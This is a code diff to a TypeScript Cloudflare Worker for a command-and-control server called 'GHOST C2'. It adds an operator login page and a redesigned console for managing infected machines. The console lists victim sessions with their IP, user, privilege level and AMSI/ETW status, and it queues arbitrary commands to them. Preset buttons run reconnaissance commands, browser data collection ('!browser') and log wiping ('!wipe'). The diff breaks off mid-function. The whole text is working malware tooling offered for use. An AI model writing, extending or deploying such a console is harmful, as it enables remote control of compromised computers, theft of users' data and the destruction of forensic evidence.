@@ -15,6 +15,10 @@ interface Env {
   GHOST_KV: KVNamespace;
   BEACON_TOKEN: string;
   OPERATOR_TOKEN: string;
+  /** Dashboard login username */
+  DASHBOARD_USER: string;
+  /** Dashboard login password */
+  DASHBOARD_PASS: string;
   /** Seconds before an idle session expires. Default: 600. */
   SESSION_TIMEOUT_SECONDS: string;
   /** Allowed CORS origin. Default: * */
@@ -583,295 +587,547 @@ async function handleDownloadPayload(env: Env): Promise<Response> {
 
 // ─── Dashboard HTML ───────────────────────────────────────
 
+const LOGIN_HTML = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>GHOST // AUTH</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#080a0e;--surface:#0d1117;--border:#1a2030;--accent:#00ff88;
+  --accent-dim:#00ff8833;--red:#ff3b5c;--yellow:#f0c040;
+  --text:#c9d1d9;--muted:#484f58;--mono:'JetBrains Mono','Fira Code',monospace;
+}
+html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--mono),monospace}
+body{display:flex;align-items:center;justify-content:center;min-height:100dvh;position:relative;overflow:hidden}
+.scanline{position:fixed;inset:0;pointer-events:none;z-index:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,0.015) 2px,rgba(0,255,136,0.015) 4px)}
+.grid-bg{position:fixed;inset:0;pointer-events:none;z-index:0;
+  background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+  background-size:40px 40px;opacity:.4}
+.panel{position:relative;z-index:1;width:360px;border:1px solid var(--border);background:var(--surface);padding:40px 36px}
+.panel::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent)}
+.logo{font-size:11px;letter-spacing:.3em;color:var(--muted);text-transform:uppercase;margin-bottom:6px}
+.title{font-size:22px;font-weight:700;letter-spacing:.08em;color:var(--accent);margin-bottom:4px;text-shadow:0 0 20px rgba(0,255,136,.4)}
+.subtitle{font-size:10px;color:var(--muted);letter-spacing:.15em;text-transform:uppercase;margin-bottom:32px}
+.field{margin-bottom:16px}
+.field label{display:block;font-size:10px;letter-spacing:.15em;color:var(--muted);text-transform:uppercase;margin-bottom:6px}
+.field input{width:100%;background:#0a0d14;border:1px solid var(--border);color:var(--text);padding:10px 12px;
+  font-family:var(--mono);font-size:13px;outline:none;transition:border-color .2s}
+.field input:focus{border-color:var(--accent)}
+.field input::placeholder{color:var(--muted)}
+.btn{width:100%;background:transparent;border:1px solid var(--accent);color:var(--accent);padding:11px;
+  font-family:var(--mono);font-size:12px;letter-spacing:.15em;text-transform:uppercase;cursor:pointer;
+  transition:background .15s,box-shadow .15s;margin-top:8px}
+.btn:hover{background:var(--accent-dim);box-shadow:0 0 16px rgba(0,255,136,.2)}
+.btn:active{transform:scale(.99)}
+.err{font-size:11px;color:var(--red);letter-spacing:.05em;margin-top:16px;padding:8px;border:1px solid rgba(255,59,92,.2);background:rgba(255,59,92,.05);display:none}
+.err.show{display:block}
+.corner{position:absolute;width:8px;height:8px;border-color:var(--accent);border-style:solid;opacity:.6}
+.corner.tl{top:-1px;left:-1px;border-width:1px 0 0 1px}
+.corner.tr{top:-1px;right:-1px;border-width:1px 1px 0 0}
+.corner.bl{bottom:-1px;left:-1px;border-width:0 0 1px 1px}
+.corner.br{bottom:-1px;right:-1px;border-width:0 1px 1px 0}
+</style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="scanline"></div>
+<div class="panel">
+  <div class="corner tl"></div><div class="corner tr"></div>
+  <div class="corner bl"></div><div class="corner br"></div>
+  <div class="logo">GHOST FRAMEWORK</div>
+  <div class="title">C2 CONSOLE</div>
+  <div class="subtitle">Operator Authentication Required</div>
+  <form id="f" onsubmit="login(event)">
+    <div class="field">
+      <label>Username</label>
+      <input id="u" type="text" placeholder="operator" autocomplete="username" required>
+    </div>
+    <div class="field">
+      <label>Password</label>
+      <input id="p" type="password" placeholder="••••••••••••" autocomplete="current-password" required>
+    </div>
+    <button class="btn" type="submit">[ AUTHENTICATE ]</button>
+  </form>
+  <div class="err" id="err">ACCESS DENIED — invalid credentials</div>
+</div>
+<script>
+async function login(e) {
+  e.preventDefault();
+  const btn = document.querySelector('.btn');
+  btn.textContent = '[ AUTHENTICATING... ]';
+  btn.disabled = true;
+  const r = await fetch('/auth', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({u: document.getElementById('u').value, p: document.getElementById('p').value})
+  });
+  if (r.ok) {
+    const {token} = await r.json();
+    sessionStorage.setItem('ghost_token', token);
+    location.href = '/dashboard';
+  } else {
+    document.getElementById('err').classList.add('show');
+    btn.textContent = '[ AUTHENTICATE ]';
+    btn.disabled = false;
+  }
+}
+</script>
+</body>
+</html>`;
+
 const DASHBOARD_HTML = `<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>GHOST C2</title>
+<title>GHOST C2 // CONSOLE</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 :root{
-  --bg:#0d0d0f;--panel:#16181d;--border:#2a2d35;--accent:#7c6af7;
-  --accent2:#4fc3f7;--red:#ef4444;--green:#22c55e;--yellow:#eab308;
-  --text:#e2e8f0;--muted:#64748b;--mono:'JetBrains Mono',monospace;
+  --bg:#080a0e;--surface:#0d1117;--surface2:#111820;--border:#1a2030;
+  --accent:#00ff88;--accent-dim:#00ff8820;--accent-glow:rgba(0,255,136,.35);
+  --red:#ff3b5c;--yellow:#f0c040;--blue:#4fc3f7;--orange:#ff8c42;
+  --text:#c9d1d9;--muted:#484f58;--muted2:#30363d;
+  --mono:'JetBrains Mono','Fira Code',monospace;
 }
-body{background:var(--bg);color:var(--text);font-family:var(--mono),monospace;font-size:13px;height:100vh;display:flex;flex-direction:column}
-header{background:var(--panel);border-bottom:1px solid var(--border);padding:10px 20px;display:flex;align-items:center;gap:16px}
-header h1{font-size:15px;font-weight:700;letter-spacing:.05em;color:var(--accent)}
-header h1 span{color:var(--text);opacity:.5}
-#status-dot{width:8px;height:8px;border-radius:50%;background:var(--muted);flex-shrink:0}
-#status-dot.live{background:var(--green);box-shadow:0 0 6px var(--green)}
-#token-bar{margin-left:auto;display:flex;gap:8px;align-items:center}
-#token-bar input{background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 10px;border-radius:4px;font-family:inherit;font-size:12px;width:340px}
-#token-bar input::placeholder{color:var(--muted)}
-button{background:var(--accent);color:#fff;border:none;padding:5px 12px;border-radius:4px;cursor:pointer;font-family:inherit;font-size:12px;font-weight:600;transition:opacity .15s}
-button:hover{opacity:.85}
-button.danger{background:var(--red)}
-button.ghost{background:transparent;border:1px solid var(--border);color:var(--muted)}
-button.ghost:hover{border-color:var(--accent);color:var(--text)}
-main{display:flex;flex:1;overflow:hidden}
-#sidebar{width:260px;flex-shrink:0;background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column}
-#sidebar-head{padding:12px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
-#sidebar-head span{font-size:11px;font-weight:700;letter-spacing:.1em;color:var(--muted);text-transform:uppercase}
+html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:var(--mono),monospace;font-size:12px}
+/* scanline overlay */
+body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.08) 2px,rgba(0,0,0,0.08) 4px)}
+
+/* ── HEADER ───────────────────────────────────────────── */
+header{height:44px;display:flex;align-items:center;gap:0;border-bottom:1px solid var(--border);background:var(--surface);flex-shrink:0;position:relative;z-index:10}
+header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent);opacity:.4}
+.hdr-logo{padding:0 16px;display:flex;align-items:center;gap:10px;border-right:1px solid var(--border);height:100%}
+.hdr-logo .ghost{font-size:13px;font-weight:700;letter-spacing:.1em;color:var(--accent);text-shadow:0 0 12px var(--accent-glow)}
+.hdr-logo .c2{font-size:10px;letter-spacing:.2em;color:var(--muted);margin-left:2px}
+.hdr-status{padding:0 16px;display:flex;align-items:center;gap:8px;border-right:1px solid var(--border);height:100%}
+.pulse{width:6px;height:6px;border-radius:50%;background:var(--muted);flex-shrink:0;transition:background .3s,box-shadow .3s}
+.pulse.live{background:var(--accent);box-shadow:0 0 8px var(--accent-glow)}
+.pulse.warn{background:var(--yellow)}
+.status-txt{font-size:10px;letter-spacing:.1em;color:var(--muted);text-transform:uppercase}
+.hdr-meta{padding:0 16px;display:flex;gap:16px;align-items:center;font-size:10px;color:var(--muted);border-right:1px solid var(--border);height:100%}
+.hdr-meta span{color:var(--text)}
+.hdr-right{margin-left:auto;padding:0 16px;display:flex;align-items:center;gap:8px}
+.hdr-btn{background:transparent;border:1px solid var(--border);color:var(--muted);padding:4px 10px;font-family:var(--mono);font-size:10px;letter-spacing:.1em;cursor:pointer;text-transform:uppercase;transition:all .15s}
+.hdr-btn:hover{border-color:var(--accent);color:var(--accent)}
+.hdr-btn.danger:hover{border-color:var(--red);color:var(--red)}
+#clock{font-size:10px;color:var(--muted);letter-spacing:.05em}
+
+/* ── LAYOUT ───────────────────────────────────────────── */
+.workspace{display:flex;flex:1;height:calc(100dvh - 44px);overflow:hidden}
+
+/* ── SIDEBAR ──────────────────────────────────────────── */
+#sidebar{width:240px;flex-shrink:0;display:flex;flex-direction:column;border-right:1px solid var(--border);background:var(--surface)}
+.pane-head{padding:8px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:var(--surface2)}
+.pane-label{font-size:9px;letter-spacing:.2em;color:var(--muted);text-transform:uppercase}
+.icon-btn{background:transparent;border:none;color:var(--muted);cursor:pointer;font-family:var(--mono);font-size:11px;padding:2px 4px;transition:color .15s}
+.icon-btn:hover{color:var(--accent)}
 #session-list{flex:1;overflow-y:auto}
-.session-item{padding:10px 14px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .1s}
-.session-item:hover{background:#1e2028}
-.session-item.active{background:#1e2028;border-left:2px solid var(--accent)}
-.session-item .sid{color:var(--accent2);font-size:11px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.session-item .meta{color:var(--muted);font-size:10px;margin-top:3px}
-.session-item .badge{display:inline-block;padding:1px 6px;border-radius:10px;font-size:10px;margin-top:4px}
-.badge-tasks{background:#7c6af722;color:var(--accent)}
-.badge-idle{background:#22c55e18;color:var(--green)}
-.badge-stale{background:#ef444418;color:var(--red)}
-#content{flex:1;display:flex;flex-direction:column;overflow:hidden}
-#content-head{padding:12px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-wrap:wrap}
-#selected-sid{font-weight:700;color:var(--accent2)}
-#recon-bar{font-size:11px;color:var(--muted);flex:1}
-#results-box{flex:1;overflow-y:auto;padding:14px;display:flex;flex-direction:column;gap:10px}
-.result-entry{background:var(--panel);border:1px solid var(--border);border-radius:6px;overflow:hidden}
-.result-ts{padding:5px 10px;background:#1e2028;color:var(--muted);font-size:10px;border-bottom:1px solid var(--border)}
-.result-body{padding:10px;white-space:pre-wrap;word-break:break-all;color:var(--text);line-height:1.6;max-height:340px;overflow-y:auto;font-size:12px}
-#cmd-bar{padding:12px 16px;border-top:1px solid var(--border);display:flex;gap:8px;background:var(--panel)}
-#cmd-input{flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:7px 12px;border-radius:4px;font-family:inherit;font-size:13px}
-#cmd-input::placeholder{color:var(--muted)}
-#cmd-input:focus{outline:none;border-color:var(--accent)}
-#no-session{flex:1;display:flex;align-items:center;justify-content:center;color:var(--muted);font-size:14px}
-#audit-panel{width:300px;flex-shrink:0;background:var(--panel);border-left:1px solid var(--border);display:flex;flex-direction:column}
-#audit-panel-head{padding:12px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
-#audit-panel-head span{font-size:11px;font-weight:700;letter-spacing:.1em;color:var(--muted);text-transform:uppercase}
-#audit-list{flex:1;overflow-y:auto;padding:8px}
-.audit-entry{padding:6px 8px;border-radius:4px;margin-bottom:4px;font-size:10px;border:1px solid var(--border)}
-.audit-entry .atime{color:var(--muted);display:block;margin-bottom:2px}
-.audit-entry .aact{color:var(--accent);font-weight:700}
-.audit-entry .aip{color:var(--muted)}
-#tabs{display:flex;border-bottom:1px solid var(--border)}
-.tab{padding:8px 16px;cursor:pointer;font-size:11px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;color:var(--muted);border-bottom:2px solid transparent;transition:all .15s}
+.no-sessions{padding:20px 12px;color:var(--muted);font-size:10px;letter-spacing:.05em}
+.session-item{padding:10px 12px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .1s;position:relative}
+.session-item::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:transparent;transition:background .1s}
+.session-item:hover{background:var(--surface2)}
+.session-item.active{background:#0d1f15}
+.session-item.active::before{background:var(--accent)}
+.sid{font-size:10px;font-weight:700;color:var(--accent);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;letter-spacing:.05em}
+.smeta{color:var(--muted);font-size:9px;margin-top:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.sbadge{display:inline-flex;align-items:center;gap:4px;margin-top:5px;padding:2px 6px;font-size:9px;letter-spacing:.08em;text-transform:uppercase;border:1px solid}
+.sbadge.live{border-color:rgba(0,255,136,.3);color:var(--accent)}
+.sbadge.tasks{border-color:rgba(240,192,64,.3);color:var(--yellow)}
+.sbadge.stale{border-color:rgba(255,59,92,.3);color:var(--red)}
+.sbadge-dot{width:4px;height:4px;border-radius:50%;background:currentColor}
+
+/* ── MAIN CONTENT ─────────────────────────────────────── */
+#main{flex:1;display:flex;flex-direction:column;overflow:hidden}
+#tab-bar{display:flex;border-bottom:1px solid var(--border);background:var(--surface);flex-shrink:0}
+.tab{padding:0 18px;height:36px;display:flex;align-items:center;font-size:10px;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s;gap:6px}
+.tab:hover{color:var(--text)}
 .tab.active{color:var(--accent);border-bottom-color:var(--accent)}
-#toast{position:fixed;bottom:20px;right:20px;background:var(--panel);border:1px solid var(--border);padding:10px 16px;border-radius:6px;font-size:12px;opacity:0;transition:opacity .2s;pointer-events:none;z-index:999}
+.tab-count{background:var(--surface2);padding:1px 5px;font-size:9px;color:var(--muted)}
+.tab.active .tab-count{background:var(--accent-dim);color:var(--accent)}
+
+#session-header{padding:8px 14px;border-bottom:1px solid var(--border);background:var(--surface2);display:none;align-items:center;gap:10px;flex-wrap:wrap;flex-shrink:0}
+.sel-sid{font-size:11px;font-weight:700;color:var(--accent);letter-spacing:.06em}
+.sel-meta{font-size:10px;color:var(--muted);flex:1}
+.sel-actions{display:flex;gap:6px}
+.act-btn{background:transparent;border:1px solid var(--border);color:var(--muted);padding:3px 8px;font-family:var(--mono);font-size:9px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;transition:all .15s}
+.act-btn:hover{border-color:var(--accent);color:var(--accent)}
+.act-btn.kill:hover{border-color:var(--red);color:var(--red)}
+
+#empty-state{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;color:var(--muted)}
+.empty-glyph{font-size:28px;opacity:.3;letter-spacing:.2em}
+.empty-msg{font-size:11px;letter-spacing:.15em;text-transform:uppercase;opacity:.5}
+
+#output-pane{flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:8px;display:none}
+#recon-pane{flex:1;overflow-y:auto;padding:12px;display:none}
+
+/* result entries */
+.result-entry{border:1px solid var(--border);overflow:hidden}
+.result-ts{padding:4px 10px;background:var(--surface2);color:var(--muted);font-size:9px;letter-spacing:.08em;border-bottom:1px solid var(--border);display:flex;gap:8px}
+.result-ts .ts-label{color:var(--accent);font-weight:700}
+.result-body{padding:10px;white-space:pre-wrap;word-break:break-all;color:var(--text);line-height:1.7;max-height:320px;overflow-y:auto;font-size:11px}
+
+/* recon grid */
+.recon-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}
+.recon-cell{border:1px solid var(--border);padding:10px 12px;background:var(--surface2)}
+.recon-key{font-size:9px;letter-spacing:.15em;color:var(--muted);text-transform:uppercase;margin-bottom:4px}
+.recon-val{font-size:12px;color:var(--text);word-break:break-all}
+.recon-val.hi{color:var(--accent)}
+.recon-val.warn{color:var(--yellow)}
+.recon-val.danger{color:var(--red)}
+
+/* ── COMMAND BAR ──────────────────────────────────────── */
+#cmd-bar{padding:10px 12px;border-top:1px solid var(--border);background:var(--surface);display:none;flex-shrink:0}
+.cmd-row{display:flex;gap:6px;margin-bottom:6px}
+.cmd-prompt{color:var(--accent);font-size:12px;padding:7px 0;flex-shrink:0;letter-spacing:.05em}
+#cmd-input{flex:1;background:#050810;border:1px solid var(--border);color:var(--accent);padding:7px 10px;font-family:var(--mono);font-size:12px;outline:none;caret-color:var(--accent)}
+#cmd-input:focus{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent-dim)}
+#cmd-input::placeholder{color:var(--muted)}
+.quick-cmds{display:flex;gap:4px;flex-wrap:wrap}
+.qcmd{background:transparent;border:1px solid var(--border);color:var(--muted);padding:3px 8px;font-family:var(--mono);font-size:9px;letter-spacing:.08em;cursor:pointer;text-transform:uppercase;transition:all .15s}
+.qcmd:hover{border-color:var(--accent);color:var(--accent)}
+
+/* ── AUDIT PANEL ──────────────────────────────────────── */
+#audit-panel{width:260px;flex-shrink:0;display:flex;flex-direction:column;border-left:1px solid var(--border);background:var(--surface)}
+#audit-list{flex:1;overflow-y:auto;padding:6px}
+.audit-entry{padding:6px 8px;margin-bottom:2px;border-left:2px solid transparent;font-size:9px}
+.audit-entry.list_sessions{border-left-color:var(--muted2)}
+.audit-entry.task_queued{border-left-color:var(--yellow)}
+.audit-entry.kill_session{border-left-color:var(--red)}
+.audit-entry.get_results{border-left-color:var(--blue)}
+.audit-entry.payload_uploaded{border-left-color:var(--orange)}
+.a-time{color:var(--muted);letter-spacing:.03em;margin-bottom:2px}
+.a-action{color:var(--text);font-weight:700;letter-spacing:.06em;text-transform:uppercase}
+.a-ip{color:var(--muted);font-size:8px;margin-top:1px}
+
+/* ── TOAST ────────────────────────────────────────────── */
+#toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:var(--surface2);border:1px solid var(--border);padding:8px 16px;font-size:11px;letter-spacing:.06em;opacity:0;transition:opacity .2s;pointer-events:none;z-index:9998;white-space:nowrap}
 #toast.show{opacity:1}
+#toast.ok{border-color:rgba(0,255,136,.4);color:var(--accent)}
+#toast.err{border-color:rgba(255,59,92,.4);color:var(--red)}
+
+/* ── SCROLLBAR ────────────────────────────────────────── */
 ::-webkit-scrollbar{width:4px;height:4px}
 ::-webkit-scrollbar-track{background:transparent}
-::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
+::-webkit-scrollbar-thumb{background:var(--border)}
 </style>
 </head>
 <body>
 <header>
-  <div id="status-dot"></div>
-  <h1>GHOST <span>C2</span></h1>
-  <div id="token-bar">
-    <input id="op-token" type="password" placeholder="Operator token (X-Operator-Token)">
-    <button onclick="connect()">Connect</button>
+  <div class="hdr-logo">
+    <span class="ghost">GHOST</span><span class="c2">// C2</span>
+  </div>
+  <div class="hdr-status">
+    <div class="pulse" id="pulse"></div>
+    <span class="status-txt" id="status-txt">OFFLINE</span>
+  </div>
+  <div class="hdr-meta">
+    SESSIONS <span id="hdr-count">0</span>
+  </div>
+  <div class="hdr-right">
+    <span id="clock"></span>
+    <button class="hdr-btn danger" onclick="logout()">LOGOUT</button>
   </div>
 </header>
-<main>
+<div class="workspace">
   <div id="sidebar">
-    <div id="sidebar-head">
-      <span>Sessions</span>
-      <button class="ghost" onclick="refreshSessions()" style="padding:3px 8px;font-size:10px">↻</button>
+    <div class="pane-head">
+      <span class="pane-label">Active Nodes</span>
+      <button class="icon-btn" onclick="refreshSessions()" title="Refresh">&#x21bb;</button>
     </div>
-    <div id="session-list"><div style="padding:20px;color:var(--muted);font-size:11px">Not connected</div></div>
+    <div id="session-list"><div class="no-sessions">AWAITING CONNECTIONS</div></div>
   </div>
-  <div id="content">
-    <div id="tabs">
-      <div class="tab active" onclick="switchTab('results')">Output</div>
-      <div class="tab" onclick="switchTab('recon')">Recon</div>
+
+  <div id="main">
+    <div id="tab-bar">
+      <div class="tab active" data-tab="output" onclick="switchTab('output')">OUTPUT <span class="tab-count" id="tc-output">0</span></div>
+      <div class="tab" data-tab="recon" onclick="switchTab('recon')">RECON</div>
     </div>
-    <div id="content-head" style="display:none">
-      <span id="selected-sid"></span>
-      <span id="recon-bar"></span>
-      <button class="ghost" onclick="fetchResults()" style="padding:3px 8px;font-size:10px">↻</button>
-      <button class="danger" style="padding:3px 8px;font-size:10px" onclick="killSession()">Kill</button>
+    <div id="session-header">
+      <span class="sel-sid" id="sel-sid"></span>
+      <span class="sel-meta" id="sel-meta"></span>
+      <div class="sel-actions">
+        <button class="act-btn" onclick="fetchResults()">REFRESH</button>
+        <button class="act-btn kill" onclick="killSession()">KILL</button>
+      </div>
     </div>
-    <div id="no-session">← Select a session</div>
-    <div id="results-box" style="display:none"></div>
-    <div id="recon-box" style="display:none;flex:1;overflow-y:auto;padding:14px"></div>
-    <div id="cmd-bar" style="display:none">
-      <input id="cmd-input" placeholder="Command…" onkeydown="if(event.key==='Enter')sendCmd()">
-      <button onclick="sendCmd()">Send</button>
-      <button class="ghost" onclick="sendCmd('!wipe')">Wipe Logs</button>
-      <button class="ghost" onclick="sendCmd('!browser')">Browsers</button>
-      <button class="ghost" onclick="sendCmd('!ps ')">PS</button>
+    <div id="empty-state">
+      <div class="empty-glyph">[ ]</div>
+      <div class="empty-msg">Select a node to begin</div>
+    </div>
+    <div id="output-pane"></div>
+    <div id="recon-pane"></div>
+    <div id="cmd-bar">
+      <div class="cmd-row">
+        <span class="cmd-prompt">ghost&gt;&nbsp;</span>
+        <input id="cmd-input" placeholder="enter command..." onkeydown="if(event.key==='Enter')sendCmd()">
+        <button class="act-btn" onclick="sendCmd()">EXEC</button>
+      </div>
+      <div class="quick-cmds">
+        <button class="qcmd" onclick="sendCmd('whoami')">whoami</button>
+        <button class="qcmd" onclick="sendCmd('ipconfig /all')">ipconfig</button>
+        <button class="qcmd" onclick="sendCmd('tasklist')">tasklist</button>
+        <button class="qcmd" onclick="sendCmd('systeminfo')">sysinfo</button>
+        <button class="qcmd" onclick="sendCmd('!ps ')">ps</button>
+        <button class="qcmd" onclick="sendCmd('!browser')">browsers</button>
+        <button class="qcmd" onclick="sendCmd('!wipe')">wipe logs</button>
+      </div>
     </div>
   </div>
+
   <div id="audit-panel">
-    <div id="audit-panel-head">
-      <span>Audit</span>
-      <button class="ghost" onclick="fetchAudit()" style="padding:3px 8px;font-size:10px">↻</button>
+    <div class="pane-head">
+      <span class="pane-label">Audit Log</span>
+      <button class="icon-btn" onclick="fetchAudit()" title="Refresh">&#x21bb;</button>
     </div>
-    <div id="audit-list"><div style="padding:20px;color:var(--muted);font-size:11px">—</div></div>
+    <div id="audit-list"><div class="no-sessions">NO ENTRIES</div></div>
   </div>
-</main>
+</div>
 <div id="toast"></div>
 <script>
-let token = '';
-let selectedSid = null;
-let pollInterval = null;
-let auditInterval = null;
-let currentTab = 'results';
+(function(){
+  const token = sessionStorage.getItem('ghost_token');
+  if (!token) { location.href = '/'; return; }
 
-function toast(msg, dur=2500) {
-  const el = document.getElementById('toast');
-  el.textContent = msg;
-  el.classList.add('show');
-  setTimeout(() => el.classList.remove('show'), dur);
-}
+  let selectedSid = null, pollTimer = null, auditTimer = null, currentTab = 'output';
 
-function headers() {
-  return { 'Content-Type': 'application/json', 'X-Operator-Token': token };
-}
-
-async function apiFetch(path, opts={}) {
-  const r = await fetch(path, { headers: headers(), ...opts });
-  if (r.status === 401) { toast('Invalid operator token'); return null; }
-  return r;
-}
-
-async function connect() {
-  token = document.getElementById('op-token').value.trim();
-  if (!token) return toast('Enter operator token first');
-  await refreshSessions();
-  await fetchAudit();
-  clearInterval(pollInterval);
-  clearInterval(auditInterval);
-  pollInterval = setInterval(async () => {
-    await refreshSessions();
-    if (selectedSid) await fetchResults();
-  }, 5000);
-  auditInterval = setInterval(fetchAudit, 15000);
-  document.getElementById('status-dot').className = 'live';
-  toast('Connected');
-}
-
-async function refreshSessions() {
-  const r = await apiFetch('/sessions');
-  if (!r) return;
-  const sessions = await r.json();
-  const list = document.getElementById('session-list');
-  if (!sessions.length) { list.innerHTML = '<div style="padding:20px;color:var(--muted);font-size:11px">No active sessions</div>'; return; }
-  sessions.sort((a,b) => new Date(b.last_beacon) - new Date(a.last_beacon));
-  list.innerHTML = sessions.map(s => {
-    const idle = s.idle_seconds;
-    const stale = idle > 180;
-    const badgeCls = s.pending_tasks > 0 ? 'badge-tasks' : stale ? 'badge-stale' : 'badge-idle';
-    const badgeTxt = s.pending_tasks > 0 ? s.pending_tasks + ' queued' : stale ? 'stale ' + fmt(idle) : 'live ' + fmt(idle);
-    const active = s.session === selectedSid ? 'active' : '';
-    return \`<div class="session-item \${active}" onclick="selectSession('\${esc(s.session)}')">
-      <div class="sid">\${esc(s.session)}</div>
-      <div class="meta">\${esc(s.remote_ip)} · \${esc(s.recon?.hostname||'?')} · \${esc(s.recon?.user||'?')}</div>
-      <span class="badge \${badgeCls}">\${badgeTxt}</span>
-    </div>\`;
-  }).join('');
-}
-
-function fmt(secs) {
-  if (secs < 60) return secs + 's';
-  if (secs < 3600) return Math.floor(secs/60) + 'm';
-  return Math.floor(secs/3600) + 'h';
-}
-
-function esc(s) {
-  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
-}
-
-async function selectSession(sid) {
-  selectedSid = sid;
-  document.getElementById('selected-sid').textContent = sid;
-  document.getElementById('content-head').style.display = 'flex';
-  document.getElementById('no-session').style.display = 'none';
-  document.getElementById('cmd-bar').style.display = 'flex';
-  switchTab(currentTab);
-  await refreshSessions();
-  await fetchResults();
-  await fetchRecon();
-}
-
-function switchTab(tab) {
-  currentTab = tab;
-  document.querySelectorAll('.tab').forEach((t,i) => t.classList.toggle('active', (i===0&&tab==='results')||(i===1&&tab==='recon')));
-  document.getElementById('results-box').style.display = tab === 'results' && selectedSid ? 'flex' : 'none';
-  document.getElementById('results-box').style.flexDirection = 'column';
-  document.getElementById('recon-box').style.display = tab === 'recon' && selectedSid ? 'block' : 'none';
-}
-
-async function fetchResults() {
-  if (!selectedSid) return;
-  const r = await apiFetch('/results/' + encodeURIComponent(selectedSid));
-  if (!r) return;
-  const data = await r.json();
-  const box = document.getElementById('results-box');
-  if (!data.results || !data.results.length) { box.innerHTML = '<div style="color:var(--muted);font-size:11px;padding:10px">No results yet</div>'; return; }
-  box.innerHTML = data.results.slice().reverse().map(e =>
-    \`<div class="result-entry"><div class="result-ts">\${esc(e.ts)}</div><div class="result-body">\${esc(e.output)}</div></div>\`
-  ).join('');
-}
-
-async function fetchRecon() {
-  if (!selectedSid) return;
-  const r = await apiFetch('/sessions');
-  if (!r) return;
-  const sessions = await r.json();
-  const s = sessions.find(x => x.session === selectedSid);
-  if (!s) return;
-  const recon = s.recon || {};
-  const bar = [
-    recon.hostname && \`<b>\${esc(recon.hostname)}</b>\`,
-    recon.user && esc(recon.user),
-    recon.elevated && '<span style="color:var(--red)">SYSTEM</span>',
-    recon.build && 'build ' + recon.build,
-    recon.amsi && '<span style="color:var(--green)">AMSI✓</span>',
-    recon.etw  && '<span style="color:var(--green)">ETW✓</span>',
-  ].filter(Boolean).join(' · ');
-  document.getElementById('recon-bar').innerHTML = bar;
-  document.getElementById('recon-box').innerHTML =
-    '<pre style="color:var(--text);font-size:11px;line-height:1.8">' + esc(JSON.stringify(s, null, 2)) + '</pre>';
-}
-
-async function sendCmd(preset) {
-  if (!selectedSid) return toast('No session selected');
-  const input = document.getElementById('cmd-input');
-  const cmd = preset || input.value.trim();
-  if (!cmd) return;
-  const r = await apiFetch('/task', {
-    method: 'POST',
-    body: JSON.stringify({ session: selectedSid, cmd })
-  });
-  if (!r) return;
-  const data = await r.json();
-  if (data.status === 'queued') {
-    toast('Queued · depth=' + data.queue_depth);
-    if (!preset) input.value = '';
-  } else {
-    toast('Error: ' + JSON.stringify(data));
+  // ── Clock ──
+  function tick() {
+    const n = new Date();
+    document.getElementById('clock').textContent =
+      n.toISOString().replace('T',' ').slice(0,19) + ' UTC';
   }
-}
+  tick(); setInterval(tick, 1000);
 
-async function killSession() {
-  if (!selectedSid || !confirm('Queue exit for ' + selectedSid + '?')) return;
-  const r = await apiFetch('/sessions/' + encodeURIComponent(selectedSid), { method: 'DELETE' });
-  if (!r) return;
-  toast('Exit queued');
-  selectedSid = null;
-  document.getElementById('content-head').style.display = 'none';
-  document.getElementById('no-session').style.display = 'flex';
-  document.getElementById('results-box').style.display = 'none';
-  document.getElementById('cmd-bar').style.display = 'none';
-  await refreshSessions();
-}
+  // ── Toast ──
+  function toast(msg, type='ok', dur=2500) {
+    const el = document.getElementById('toast');
+    el.textContent = msg;
+    el.className = 'show ' + type;
+    clearTimeout(el._t);
+    el._t = setTimeout(() => el.className = '', dur);
+  }
 
-async function fetchAudit() {
-  const r = await apiFetch('/audit?limit=50');
-  if (!r) return;
-  const data = await r.json();
-  const list = document.getElementById('audit-list');
